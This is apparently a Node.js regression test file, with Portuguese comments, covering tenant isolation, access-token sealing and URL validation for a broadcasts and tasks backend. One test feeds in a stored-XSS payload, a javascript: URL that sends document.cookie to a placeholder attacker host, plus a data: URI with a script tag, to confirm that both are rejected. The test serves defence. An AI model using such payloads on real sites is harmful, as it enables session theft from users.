/**
 * Regressões de segurança — multi-tenant, MFA gate e selagem de tokens.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const { mock } = require('node:test');

require('../test/ensure-test-env');

test('broadcasts: SELECTED rejeita clientIds de outro escritório', async () => {
  const broadcastsService = require('../modules/broadcasts/broadcasts.service');
  const clientsRepository = require('../db/supabase/repositories/clients.repository');
  const broadcastsRepository = require('../db/supabase/repositories/broadcasts.repository');

  mock.method(clientsRepository, 'findClientsByIds', async () => [{ id: 'client-own' }]);
  mock.method(broadcastsRepository, 'findBySlug', async () => null);
  mock.method(broadcastsRepository, 'insertBroadcast', async () => {
    throw new Error('não deve inserir com IDs cruzados');
  });

  await assert.rejects(
    () =>
      broadcastsService.createBroadcast({
        firmId: 'firm-a',
        author: { id: 'u1', name: 'Staff' },
        payload: {
          title: 'Alerta',
          body: 'Corpo',
          targetType: 'SELECTED',
          targetClientIds: ['client-own', 'client-other-firm'],
        },
      }),
    (err) => err?.details?.code === 'CLIENT_NOT_IN_FIRM' || err?.statusCode === 400,
  );
});

test('intake access token: selagem produz hash e ciphertext', () => {
  const repo = require('../db/supabase/repositories/service-inquiries.repository');
  const raw = 'a'.repeat(64);
  const sealed = repo.sealAccessTokenFields(raw);
  assert.ok(sealed.access_token_hash);
  assert.equal(sealed.access_token_hash, repo.hashIntakeAccessToken(raw));
  assert.notEqual(sealed.access_token, raw);
  assert.ok(String(sealed.access_token).startsWith('enc:v1:'));
  assert.equal(repo.hashIntakeAccessToken(raw), repo.hashIntakeAccessToken(raw));
});

// Regressão (segunda auditoria): coverUrl/ctaUrl de broadcasts eram gravados crus,
// sem passar pela mesma validação de esquema já aplicada em news.coverUrl e
// accounting-services.imageUrl — a mesma classe de stored XSS (javascript:) tinha
// ficado destapada nesta tabela irmã.
test('broadcasts: rejeita coverUrl/ctaUrl com esquema javascript: em vez de gravar cru', async () => {
  const broadcastsService = require('../modules/broadcasts/broadcasts.service');
  const clientsRepository = require('../db/supabase/repositories/clients.repository');
  const broadcastsRepository = require('../db/supabase/repositories/broadcasts.repository');

  mock.method(broadcastsRepository, 'findBySlug', async () => null);
  let savedRow = null;
  mock.method(broadcastsRepository, 'insertBroadcast', async (row) => {
    savedRow = row;
    return { id: 'broadcast-1', ...row };
  });

  await broadcastsService.createBroadcast({
    firmId: 'firm-a',
    author: { id: 'u1', name: 'Staff' },
    payload: {
      title: 'Alerta',
      body: 'Corpo',
      coverUrl: "javascript:fetch('//evil.tld/x?c='+document.cookie)",
      ctaUrl: 'data:text/html,<script>alert(1)</script>',
    },
  });

  assert.equal(savedRow.cover_url, null, 'URI javascript: não deve chegar ao INSERT em cover_url');
  assert.equal(savedRow.cta_url, null, 'URI data: não deve chegar ao INSERT em cta_url');
});

test('broadcasts: preserva coverUrl/ctaUrl https legítimos', async () => {
  const broadcastsService = require('../modules/broadcasts/broadcasts.service');
  const broadcastsRepository = require('../db/supabase/repositories/broadcasts.repository');

  mock.method(broadcastsRepository, 'findBySlug', async () => null);
  let savedRow = null;
  mock.method(broadcastsRepository, 'insertBroadcast', async (row) => {
    savedRow = row;
    return { id: 'broadcast-2', ...row };
  });

  await broadcastsService.createBroadcast({
    firmId: 'firm-a',
    author: { id: 'u1', name: 'Staff' },
    payload: {
      title: 'Alerta',
      body: 'Corpo',
      coverUrl: 'https://cdn.teglion.com/alerta.png',
      ctaUrl: 'https://app.teglion.com/promo',
    },
  });

  assert.equal(savedRow.cover_url, 'https://cdn.teglion.com/alerta.png');
  assert.equal(savedRow.cta_url, 'https://app.teglion.com/promo');
});

test('tasks: assignee de outro escritório é rejeitado no create', async () => {
  const workspace = require('../modules/tasks/tasks-workspace.service');
  const clientsRepository = require('../db/supabase/repositories/clients.repository');
  const firmUsersRepository = require('../db/supabase/repositories/firm-users.repository');

  mock.method(clientsRepository, 'findClientById', async () => ({ id: 'c1', firmId: 'firm-a' }));
  mock.method(firmUsersRepository, 'findFirmUserByIdForFirm', async () => null);

  await assert.rejects(
    () =>
      workspace.createTask({
        firmId: 'firm-a',
        actor: { id: 'staff-1' },
        payload: {
          title: 'Tarefa',
          clientIds: ['c1'],
          assigneeId: 'foreign-user',
        },
      }),
    (err) => err?.details?.code === 'ASSIGNEE_NOT_IN_FIRM' || err?.statusCode === 400,
  );
});
